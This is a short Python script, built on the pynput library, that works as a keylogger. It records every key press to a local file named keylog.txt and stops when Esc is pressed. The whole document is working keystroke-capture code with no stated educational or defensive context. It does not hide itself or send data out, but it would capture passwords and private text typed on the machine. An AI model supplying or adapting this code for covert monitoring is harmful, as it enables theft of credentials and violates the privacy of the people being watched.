from pynput.keyboard import Key, Listener

keylog = open("keylog.txt", "a")

def key_press(key):
	global keylog
	keylog.write(str(key))

def key_release(key):
	global keylog
	if key == Key.esc:
		keylog.close()
		return False

with Listener(on_press = key_press, on_release = key_release) as listener:
	listener.join()